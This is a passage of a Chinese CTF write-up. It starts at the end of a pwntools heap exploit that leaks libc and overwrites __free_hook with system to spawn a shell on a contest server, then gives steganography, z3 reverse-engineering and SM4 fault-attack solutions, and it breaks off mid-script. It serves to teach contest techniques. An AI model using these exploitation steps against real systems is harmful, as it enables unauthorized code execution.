&#x27;</span>,<span class="built_in">str</span>(value))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">m_free</span>():</span><br><span class="line">	menu(<span class="number">8</span>)</span><br><span class="line">p = process(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line">libc =ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;106.14.214.3&#x27;</span>,<span class="number">2333</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">	new(i,<span class="number">0x100</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">	free(<span class="number">7</span> - i)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">	new(i + <span class="number">1</span>,<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Content: &#x27;</span>)</span><br><span class="line">heap_base = u32(p.recv(<span class="number">4</span>)) - <span class="number">0x380</span></span><br><span class="line">log.info(<span class="string">&#x27;HEAP:\t&#x27;</span> + <span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">new(<span class="number">0</span>,<span class="number">0x78</span>)</span><br><span class="line">new(<span class="number">8</span>,<span class="number">0x78</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="string">&#x27;/bin/sh\n&#x27;</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base = u32(p.recvuntil(<span class="string">&#x27;\xF7&#x27;</span>)[-<span class="number">4</span>:]) - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] - <span class="number">0xD8</span></span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&#x27;LIBC:\t&#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">rce = libc_base + <span class="number">0x3D130</span></span><br><span class="line">m_new(<span class="number">0</span>)</span><br><span class="line">address = ((free_hook - <span class="number">0xE0000000</span>)&gt;&gt;<span class="number">2</span>)</span><br><span class="line">m_edit(address,system)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2><span id="misc">Misc</span><a href="#misc" class="header-anchor"></a></h2><h3><span id="miscstudy">miscstudy</span><a href="#miscstudy" class="header-anchor"></a></h3><p><img src="https://hackmd.summershrimp.com/uploads/upload_6a55e4763ec72134b9c0b3d913bd724b.png"></p>
<p>找到一个访问 <a href="http://39.99.247.28/fonts/1">http://39.99.247.28/fonts/1</a> 的流量</p>
<p><img src="https://hackmd.summershrimp.com/uploads/upload_7456417605938132686ff20660e7d9ff.png"></p>
<p>得到flag{level1_begin_and_level2_is_come</p>
<p>还从中得到了私钥信息，将其导入Wireshark可以解密后续的部分TLS流量。</p>
<p>继续往后翻stream，可以发现一个图片：<br><img src="https://hackmd.summershrimp.com/uploads/upload_d374609201cbd3daf43e87e452f03c30.png"></p>
<p>访问 <a href="https://www.qiangwangbei.com/images/4e5d47b2db53654959295bba216858932.png">https://www.qiangwangbei.com/images/4e5d47b2db53654959295bba216858932.png</a> 下载图片</p>
<p>在末尾能看到一串类似base64编码的字符串：</p>
<p><img src="https://hackmd.summershrimp.com/uploads/upload_96ed59c4dba7593974234283b98b6ca3.png"></p>
<p>解码得到level3_start_it</p>
<p><img src="https://hackmd.summershrimp.com/uploads/upload_d88a9c7631f80aee514a93c951730a2b.png"></p>
<p>在文件末尾的上面，也能发现3串base64编码后的字符串，对其分别解码后得到一串长度为3600的01字符串，按照每60个一行，可以得到一个二维码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">x = <span class="number">60</span></span><br><span class="line">y = <span class="number">60</span></span><br><span class="line"></span><br><span class="line">black = (<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">white = (<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>)</span><br><span class="line"></span><br><span class="line">data = <span class="string">&quot;000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001111111111110000000100110000100000000011100001111111111100001111111111110000000110111000100000000011100001111111111100001100000000110010011111110010000000001100111001000000000100001100000000110010000110110010000000000001111001000000000100001100111100110010000100110010011100000011101001001111100100001100111100110000100000001110011111110010000001001111100100001100111100110000000000001110011110110010000001001111100100001100111100110011100100111111111100110011100000001111100100001100000000110011000000000111100110110110000001000000000100001100000000110010011000000011100011111110011001000000000100001111111111110010011001001001100110110010011001111111111100001111111111110010011001001100000100110010011001111111111100000000000000000010011111110010011000111000100000000000000000000000000000000010001111100010011000011101100000000000000000001110011000111100000001000000011000001111111001111000111000000110000000000000000001000000011000000000011001000000000000000010000001000011100001000000111100110000011000000010000000001110011001111110000000000000010001001110011111000010011000001110011001111110000000000000011001001110011111000010011000001100111000000011111000000010000100000100100111000000100100000001100000000111011000000111000100001100000111000000000000000011100000111110011000001111111100001100011111110010000000000000111001001100000000001100000111001110011111001000100100000000111001001000000000001000000111001110011111001100100100000011100000110011111111000000011100001111111000001110011100000011000000010011111110000000011100001111111000000110001100000000000100000010000000000000011000001110011001000000100100000000000000000110000000000000000000001110011011100000000000000010001001111110000100000000100000011111111101111100000000000011000000001110000000111111100110000001100000000010000000000011100000001110000000111111100111000000100000000010000000001110000100111111111111000000011100111000011000001100000000001111000110001001100111000000011000011100011000000000000000001111100111001100100101111111111001111100001001110011111100001100000111110000100000000010000000111100011000000011100100001000000111110000100000000010000000111000011000000011100100000011011100000011100000000000000001110000011111000001100100000111111100000011000000000000000011100000001101000000100100001111100000110010000100000000011111000010000000001100010000000111100000000010000110000000000000000110000000001100000000000011100100000010011111000011100000001110000000111000100000001100111000111110011111001111111100001010011111111100011000001000111000111110011111001111111100001110011011111100011000000000000000000010011001001110000001110001111000001100000100000000000000000010011000001100000000110000011000001100000100001111111111110010011000111000110000111100011001001100111100001100000000110000111100000011111111001110001000001100111000001100000000110000111100000011111111001110011000001100111000001100111100110000100001000000100001001110011111111100000000001100111100110000100001000001100001001100001111111000000000001100111100110010011000111111111000111110000111000011011100001100111100110000011000110000000000000110000000000011011100001100111100110000011111110000000100001110011000000000011100001100000000110011100100111000011001111100011111111111100000001100000000110011100100111000011001111100011111111111100000001011111111010010011111110011111001001110011111100000011000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&quot;</span></span><br><span class="line">img = Image.new(<span class="string">&quot;RGB&quot;</span>, (x,y))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, x):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, y):</span><br><span class="line">        <span class="keyword">if</span> data[i+j*<span class="number">60</span>] == <span class="string">&quot;0&quot;</span>:</span><br><span class="line">            img.putpixel((i,j), white)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            img.putpixel((i,j), black)</span><br><span class="line">            </span><br><span class="line">img.show()</span><br></pre></td></tr></table></figure>
<p><img src="https://hackmd.summershrimp.com/uploads/upload_abea5644a517e71dffcdda7ab5957760.png"></p>
<p>扫描得到<br>链接：<a href="https://pan.baidu.com/s/1wVJ7d0RLW8Rj-HOTL9Shug">https://pan.baidu.com/s/1wVJ7d0RLW8Rj-HOTL9Shug</a> 提取码：1lms</p>
<p>下载得到level4.zip</p>
<p><img src="https://hackmd.summershrimp.com/uploads/upload_4a982fd6cd1c6c0e6ea0ff6ead63c099.png"></p>
<p>stegbreak，密码power123</p>
<p>JPHS提取得到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">https://pan.baidu.com/s/1o43y4UGkm1eP-RViC25aOw</span><br><span class="line">mrpt</span><br><span class="line"></span><br><span class="line">level4_here_all</span><br></pre></td></tr></table></figure>

<p><img src="https://hackmd.summershrimp.com/uploads/upload_1f8f684177225795f5167bf2a7a69080.png"></p>
<p>level5_is_aaa</p>
<p>level6.zip中有3个txt文件，crc爆破得到level6_isready</p>
<p>level7.zip明文碰撞1.png，再水印隐写可以得到level7ishere和39.99.247.28&#x2F;final_level&#x2F;</p>
<p>源码里看到</p>
<p><img src="https://hackmd.summershrimp.com/uploads/upload_f6df4e39c4e1ca6dcb47e51e2d442ff5.png"></p>
<p>Snow隐写 解密得到the_misc_examaaaaaaa_!!!}</p>
<p>flag{level1_begin_and_level2_is_comelevel3_start_itlevel4_here_alllevel5_is_aaalevel6_isreadylevel7isherethe_misc_examaaaaaaa_!!!}</p>
<h2><span id="rev">Rev</span><a href="#rev" class="header-anchor"></a></h2><h3><span id="xx-warmup-obf">xx_warmup_obf</span><a href="#xx-warmup-obf" class="header-anchor"></a></h3><p>ELF逆向，里面全是混淆，使用pin改了一个插件出来，可以用来统计运行过的指令地址，编写idapython，将未运行的指令patch成nop，可以看到程序多了很多函数，大概流程就是：输入，判断长度28，然后进入到一个解方程的地方，解方程即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: UTF-8 -*-</span><br><span class="line">from z3 import *</span><br><span class="line">s = Solver()</span><br><span class="line">key = [BitVec(&#x27;%d&#x27;%i,8) for i in range(28)]</span><br><span class="line">s.add(key[0] == ord(&#x27;f&#x27;))</span><br><span class="line">s.add(key[1] == ord(&#x27;l&#x27;))</span><br><span class="line">s.add(key[2] == ord(&#x27;a&#x27;))</span><br><span class="line">s.add(key[3] == ord(&#x27;g&#x27;))</span><br><span class="line">s.add(key[4] == ord(&#x27;&#123;&#x27;))</span><br><span class="line">s.add(key[27] == ord(&#x27;&#125;&#x27;))</span><br><span class="line">s.add(key[23] == ord(&#x27;_&#x27;))</span><br><span class="line">s.add(23925 * key[0] == 2440350)</span><br><span class="line">s.add(281400 * key[1] - 7037 * key[0] == 29673426)</span><br><span class="line">s.add(174826 * key[0] - 255300 * key[2] - 283573 * key[1] == -37557732)</span><br><span class="line">s.add( 259881 * key[2] + -98445 * key[1] - 276718 * key[0] + 4524 * key[3] == -13182867 )</span><br><span class="line">s.add( 285576 * key[2] + -274569 * key[3] + 94721 * key[0] - 228216 * key[4] - 60353 * key[1] == -25506885 )</span><br><span class="line">s.add( 17630 * key[0]+ -258397 * key[3]+ -244952 * key[1]+ -244086 * key[2]+ -130259 * key[5]- 190371 * key[6]- 109961 * key[4] == -111027477 )</span><br><span class="line">s.add( 117817 * key[5] + 268397 * key[7] + -198175 * key[1] + 18513 * key[2] + 218992 * key[6] + -6727 * key[3] + 228408 * key[0] + 224658 * key[4] == 78775012 )</span><br><span class="line">s.add(260927 * key[3]+ -5496 * key[1]+ -294195 * key[4]+ 264844 * key[2]+ 125853 * key[5] - 153661 * key[0] == 13075233  )</span><br><span class="line">s.add( -196269 * key[8] + -64473 * key[7] + -142792 * key[5] + 171321 * key[4] + -39259 * key[9] + -269632 * key[2] + 229049 * key[6] + 96631 * key[3] - 280754 * key[1] - 168397 * key[0] == -70797046 )</span><br><span class="line">s.add( -235026 * key[4] + 162669 * key[8] + -256202 * key[1] + -32946 * key[9] + -25900 * key[2] + 195039 * key[10] + 182157 * key[3] + 292706 * key[0] + -93524 * key[5] + 121516 * key[6] + 165207 * key[7] == 28263339 )</span><br><span class="line">s.add( -288418 * key[3] + -218493 * key[7] + -236774 * key[0] + 77982 * key[2] + 190784 * key[4] + -84462 * key[1] + 92684 * key[8] + 52068 * key[5] - 243023 * key[6] == -52520267 )</span><br><span class="line">s.add( -262820 * key[4] + 9710 * key[10] + 71182 * key[12] + -184125 * key[1] + -100280 * key[6] + 62018 * key[11] + 141532 * key[9] + -138253 * key[8] + 20489 * key[0] + -214348 * key[2] + 162962 * key[3] - 93199 * key[7] + 147171 * key[5] == -31396844 )</span><br><span class="line">s.add( -131770 * key[6] + -92964 * key[9] + -111160 * key[8] + -258188 * key[7] + 133728 * key[1] + -272650 * key[5] + -4940 * key[10] + 272791 * key[3] + 80519 * key[2] + -165434 * key[11] + 50166 * key[0] + 148713 * key[4] == -22025185 )</span><br><span class="line">s.add(-55254 * key[8]+ 220404 * key[12]+ -86956 * key[10]+ -200702 * key[5]+ -51437 * key[1]+ 25739 * key[6]+ 122945 * key[3]+ 116256 * key[7]+ 22859 * key[4]+ -61880 * key[9]+ -119275 * key[2]+ -224754 * key[13]- 75412 * key[0]+ 59999 * key[11] == -37063008)</span><br><span class="line">s.add(111310 * key[0]+ 198502 * key[3]+ -189890 * key[13]+ 278745 * key[5]+ 157462 * key[9]+ 135809 * key[4]+ -2621 * key[2]+ 67553 * key[6]+ 144834 * key[1]+ -88326 * key[11]+ -228149 * key[10]+ 233663 * key[14]+ -249960 * key[12]+ 300012 * key[8]+ 91783 * key[7] == 93457153)</span><br><span class="line">s.add(15897 * key[0]+ -11943 * key[13]+ 194067 * key[3]+ 125666 * key[2]+ 104421 * key[12]+ -181764 * key[5]+ -233813 * key[8]+ -235783 * key[4]+ 230636 * key[11]+ 148005 * key[6]+ -48167 * key[14]+ -163572 * key[9]+ 54553 * key[10]+ -129997 * key[1]+ 114175 * key[7]- 251681 * key[15] == -36640750)</span><br><span class="line">s.add( -90549 * key[3]+ -228520 * key[14]+ 34835 * key[10]+ -203538 * key[15]+ 272318 * key[13]+ -68478 * key[8]+ 22454 * key[9]+ 74128 * key[12]+ 70051 * key[6]+ -289940 * key[7]+ -52501 * key[5]+ -1254 * key[4]+ 154844 * key[11]+ 254969 * key[2]+ -39495 * key[1]+ 277429 * key[16]- 132752 * key[0] == -6628237 )</span><br><span class="line">s.add( 128092 * key[11]+ -5873 * key[17]+ -144172 * key[3]+ -148216 * key[13]+ 189050 * key[2]+ 66107 * key[5]+ 237987 * key[0]+ -53271 * key[9]+ -86968 * key[12]+ -94616 * key[10]+ -247882 * key[8]+ -5107 * key[1]+ 55085 * key[15]+ 10792 * key[14]+ -112241 * key[4]+ -36680 * key[16]- 210718 * key[7]- 249539 * key[6] == -53084017 )</span><br><span class="line">s.add( -186088 * key[2]+ 19517 * key[13]+ -65515 * key[5]+ 195447 * key[1]+ 145470 * key[14]+ 58825 * key[16]+ 272227 * key[15]+ -155443 * key[8]+ 100397 * key[3]+ -238861 * key[18]+ 84628 * key[7]+ 1337 * key[17]+ 156976 * key[12]+ -74209 * key[4]+ 175077 * key[11]+ 134548 * key[0]+ -280672 * key[6]+ 12264 * key[10] + 56937 * key[9] == 60764977 )</span><br><span class="line">s.add( -58873 * key[7]+ -283834 * key[9]+ 159144 * key[13]+ -199631 * key[0]+ 54404 * key[16]+ -190345 * key[8]+ 176103 * key[3]+ 137206 * key[17]+ -170051 * key[6]+ 281718 * key[11]+ 137214 * key[14]+ -104395 * key[19]+ -122090 * key[4]+ 162065 * key[15]+ -36580 * key[18]+ 245858 * key[12]+ -18520 * key[10]+ -138274 * key[1]+ 139185 * key[2]- 197535 * key[5] == 4912728 )</span><br><span class="line">s.add( 293345 * key[9]+ 63329 * key[13]+ 74470 * key[8]+ -72984 * key[11]+ -162393 * key[20]+ 150036 * key[15]+ 127913 * key[19]+ 181147 * key[16]+ 27751 * key[6]+ -239133 * key[1]+ -28337 * key[17]+ 108149 * key[0]+ 148338 * key[2]+ 38137 * key[18]+ -199427 * key[14]+ -97284 * key[4]+ -39775 * key[3]+ -109205 * key[10]+ 270604 * key[5]- 193384 * key[12]+ 168963 * key[7] == 45577809 )</span><br><span class="line">s.add( 45637 * key[6]+ 111858 * key[17]+ 244009 * key[19]+ -188979 * key[8]+ -220539 * key[16]+ 246135 * key[2]+ -174651 * key[14]+ 179514 * key[4]+ 153071 * key[15]+ -207716 * key[21]+ 64641 * key[7]+ 293781 * key[12]+ 263208 * key[10]+ 44675 * key[1]+ 131692 * key[3]+ 109605 * key[11]+ 293201 * key[5]+ -98937 * key[9]+ 60492 * key[20]+ -273571 * key[13]- 38942 * key[0]- 285946 * key[18] == 77539017 )</span><br><span class="line">s.add( -160726 * key[9]+ 234971 * key[18]+ 32897 * key[4]+ -206184 * key[11]+ -86224 * key[20]+ 92896 * key[22]+ 295735 * key[15]+ -58530 * key[0]+ -197632 * key[13]+ -21957 * key[17]+ -43684 * key[6]+ -141434 * key[10]+ -194890 * key[1]+ -148390 * key[21]+ 105293 * key[14]+ 76213 * key[3]+ 9791 * key[12]+ -258754 * key[8]+ 59119 * key[16]+ 255675 * key[2]+ -130852 * key[7]- 71444 * key[5]+ 127285 * key[19] == -38197685 )</span><br><span class="line">s.add( 205675 * key[20]+ 197685 * key[1]+ 144870 * key[4]+ 120347 * key[10]+ 202621 * key[14]+ -236806 * key[17]+ 268813 * key[3]+ 191822 * key[23]+ -40848 * key[6]+ 103466 * key[7]+ -211930 * key[5]+ -180522 * key[19]+ -188959 * key[15]+ -238839 * key[21]+ 281705 * key[11]+ 175825 * key[16]+ -44618 * key[12]+ 196370 * key[0]+ 89330 * key[22]+ -133696 * key[8]+ -60213 * key[2]+ 191404 * key[18]- 291063 * key[9]+ 13902 * key[13] == 67763764 )</span><br><span class="line">s.add( 69341 * key[15]+ -19740 * key[21]+ 62004 * key[10]+ 29334 * key[8]+ -78459 * key[1]+ -261617 * key[3]+ 115716 * key[22]+ 7838 * key[16]+ -173902 * key[14]+ 115189 * key[9]+ 234832 * key[7]+ -54321 * key[5]+ -268221 * key[20]+ -210563 * key[18]+ -161113 * key[13]+ -199130 * key[23]+ -94067 * key[24]+ 9601 * key[11]+ -8509 * key[12]+ 14439 * key[2]+ -243227 * key[19]+ 37665 * key[17]+ 91076 * key[6]- 85246 * key[0]+ 39558 * key[4] == -98330271 )</span><br><span class="line">s.add( 38468 * key[19]+ -75568 * key[2]+ 169299 * key[22]+ -252915 * key[3]+ 32044 * key[24]+ -260264 * key[8]+ -111200 * key[1]+ -78437 * key[20]+ -212633 * key[16]+ 180400 * key[5]+ -81477 * key[12]+ 232645 * key[0]+ -65268 * key[4]+ 263000 * key[6]+ 247654 * key[25]+ -242059 * key[17]+ -35931 * key[9]+ -271816 * key[21]+ 10191 * key[13]+ 41768 * key[23]+ 92844 * key[7]+ -73366 * key[14]+ -124307 * key[10]+ 197710 * key[18]+ 226192 * key[15]+ 3788 * key[11] == -13464859 )</span><br><span class="line">s.add( -23897 * key[9]+ -188087 * key[24]+ -254282 * key[15]+ -102361 * key[23]+ -15606 * key[14]+ -74795 * key[21]+ 116581 * key[12]+ 77693 * key[5]+ -6866 * key[25]+ 215574 * key[22]+ 231326 * key[6]+ 77915 * key[2]+ 186585 * key[3]+ 219151 * key[4]+ 271210 * key[13]+ -78913 * key[20]+ 83918 * key[8]+ -153409 * key[18]+ -84952 * key[7]+ -121854 * key[0]+ -253617 * key[26]+ -213665 * key[19]+ -293146 * key[17]+ -166693 * key[16]+ -206964 * key[1]- 155664 * key[10]+ 180598 * key[11] == -55504393 )</span><br><span class="line">s.add( 264405 * key[11]+ 135302 * key[12]+ 278196 * key[9]+ -132906 * key[23]+ 138308 * key[7]+ 40423 * key[21]+ 157781 * key[0]+ -38949 * key[27]+ -143324 * key[14]+ -120743 * key[10]+ 77375 * key[5]+ -164339 * key[3]+ 167370 * key[25]+ -225830 * key[4]+ -136952 * key[2]+ -14347 * key[8]+ 6966 * key[26]+ 88628 * key[18]+ 138998 * key[22]+ 147747 * key[19]+ -106792 * key[6]+ -113009 * key[20]+ 98136 * key[15]+ 231264 * key[24]+ -109447 * key[17]+ 258890 * key[1]+ 167885 * key[16]+ 246315 * key[13] == 133068723 )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line">if s.check() == sat:</span><br><span class="line">    result = s.model()</span><br><span class="line">    print s.model()</span><br><span class="line">    for i in range(28):</span><br><span class="line">        flag += chr(result[key[i]].as_long().real)</span><br><span class="line">    print flag</span><br><span class="line">    print len(&#x27;flag&#123;g0_Fuck_xx_5egm3nt&#x27;)</span><br></pre></td></tr></table></figure>

<h3><span id="imitation-game">imitation_game</span><a href="#imitation-game" class="header-anchor"></a></h3><p>fork后子进程是一个CBC AES，正确后，父进程启动了一个chip8程序，这里的字节码进行过更改，打log后，分析，是一个</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">v0</span><br><span class="line">+2</span><br><span class="line"></span><br><span class="line">v1</span><br><span class="line">+1</span><br><span class="line"></span><br><span class="line">v2</span><br><span class="line">+1</span><br><span class="line">xor 1</span><br><span class="line"></span><br><span class="line">*********</span><br><span class="line">v3</span><br><span class="line">+3</span><br><span class="line"></span><br><span class="line">v4</span><br><span class="line">+2</span><br><span class="line"></span><br><span class="line">v5</span><br><span class="line">xor 2</span><br><span class="line">+1</span><br><span class="line">***********</span><br><span class="line">v6</span><br><span class="line">*2</span><br><span class="line"></span><br><span class="line">v7</span><br><span class="line">+1</span><br><span class="line"></span><br><span class="line">v8</span><br><span class="line">xor 1</span><br><span class="line">+1</span><br><span class="line">*************</span><br><span class="line">v9</span><br><span class="line">+2</span><br></pre></td></tr></table></figure>
<p>先对输入做上面的操作<br>然后进入27a这个乘法<br>俩个参数，一个输入一个乘法系数<br>1 2 1<br>2 1 1<br>1 2 2<br>系输如上，三组循环，解方程即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: UTF-8 -*-</span><br><span class="line">from z3 import *</span><br><span class="line">s = Solver()</span><br><span class="line">key = [BitVec(&#x27;%d&#x27;%i,8) for i in range(3)]</span><br><span class="line"></span><br><span class="line">s.add(key[0]+2*key[1]+key[2] == 0x37)</span><br><span class="line">s.add(2*key[0]+key[1]+key[2] == 0x37)</span><br><span class="line">s.add(key[0]+2*key[1]+2*key[2] == 0x3b)</span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line">if s.check() == sat:</span><br><span class="line">    print s.model()</span><br><span class="line">aaa = [10,2,13,14,15,1,2,12,1,3]</span><br><span class="line">flag = &#x27;flag&#123;6c8f1d78770fe672122478c6f9a150e6&#x27;</span><br><span class="line">for i in range(len(aaa)):</span><br><span class="line">    flag += str(hex(aaa[i]).replace(&#x27;0x&#x27;,&#x27;&#x27;))</span><br><span class="line">flag += &#x27;&#125;&#x27;</span><br><span class="line">print flag</span><br></pre></td></tr></table></figure>
<p>算出来是a2def12c13</p>
<h2><span id="crypto">Crypto</span><a href="#crypto" class="header-anchor"></a></h2><h3><span id="fault">fault</span><a href="#fault" class="header-anchor"></a></h3><p>differential fault attack SM4</p>
<p>找paper：</p>
<p>Min WANG,Zhen WU,Jin-tao RAO,Hang LING. Round reduction-based fault attack on SM4 algorithm[J]. Journal on Communications, 2016, 37(Z1): 98-103.</p>
<p>这篇不太行，直接把最后的几轮给扔了，不太realistic；不过从中学到了SM4的构造，以及SM4的DFA相关研究</p>
<p>找到了<a href="https://eprint.iacr.org/2010/063.pdf">https://eprint.iacr.org/2010/063.pdf</a></p>
<blockquote>
<p>We show that if a random byte fault is induced into either the second, third or fourth word register at the input of the 28-th round, the 128-bit master key could be derived with an exhaustive search of 22.11 bits on average. </p>
</blockquote>
<p>28轮的第2、3、4个寄存器出错，可以直接整出master key，很对头，但是有点难理解</p>
<blockquote>
<p>The procedure of the round-key generation indicates that the master key can be easily retrieved from any four consecutive round-keys.</p>
</blockquote>
<p>然后几个paper轮流看。</p>
<p><img src="https://hackmd.summershrimp.com/uploads/upload_bbc71b52cfdefddb249b337787f0c652.png"></p>
<p>选择了需要fault次数最多的那个方法。（因为容易理解一些</p>
<p>paper：<a href="https://wenku.baidu.com/view/df86818e79563c1ec5da71c4.html">https://wenku.baidu.com/view/df86818e79563c1ec5da71c4.html</a></p>
<p>出题人没整好输入的round（只能在第2～31轮注入fault， 而非1～32轮），所以操作的时候就稍微需要自己改变一下</p>
<p><img src="https://hackmd.summershrimp.com/uploads/upload_ee8ac49c5879017f86dfc47f2778e39c.png"></p>
<p>往第31轮的X30上注入1byte的fault，将会导致第32轮的X34的差分值有1byte不为0。</p>
<p>然后往F函数里面日：</p>
<p><img src="https://hackmd.summershrimp.com/uploads/upload_944a8f9c6845bac7c504f38481822778.png"></p>
<p>可以激活一个sbox：必有一个sbox的差分值不为0（其他3个sbox均为0），且这个sbox的位置可控；这个sbox的两个差分输入r_inp, f_inp 也能确定下来。</p>
<blockquote>
<p>r_byte: raw input byte<br>f_byte: fault input byte</p>
</blockquote>
<p>再来从下往上看这个sbox输出的差分值：</p>
<p><img src="https://hackmd.summershrimp.com/uploads/upload_e1c2ffc280b41e4a1e98b99227cd24d9.png"></p>
<p>paper里有具体的分析，看不懂，直接看到结论。这个结论就是说sbox输出的差分值diff_out也能确定下来。</p>
<p>ok，然后穷举这个sbox所对应那一byte子密钥rk_byte（仅256种可能，一个子密钥有4byte，每1byte对应一个sbox），计算sbox(r_inp ^ rk_byte) ^ sbox(f_inp ^ rk_byte)，看是否等于diff_out，如果等于就说明这个byte可以作为备选子密钥byte（理论值是说这边有2.0236个可能的candidate子密钥byte）。两次这么操作后，基本上就可以确定下这个byte到底是哪一个了。</p>
<p>然后这么再去另外3个sbox对应的位置处注入fault，即可恢复出这第32轮的4byte子密钥。</p>
<p>恢复出来后，可以解密一轮来到第31轮，往第30轮的X29处注入fault，等价于往第31轮的X33处注入，然后同样的操作，可以恢复这第31轮的子密钥。</p>
<p>再恢复2轮，即可得到第30、29轮的子密钥。</p>
<p>key schedule可逆，能通过这最后4轮的子密钥直接搞到master key</p>
<p>最后解密，getflag</p>
<p>脚本很乱：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span 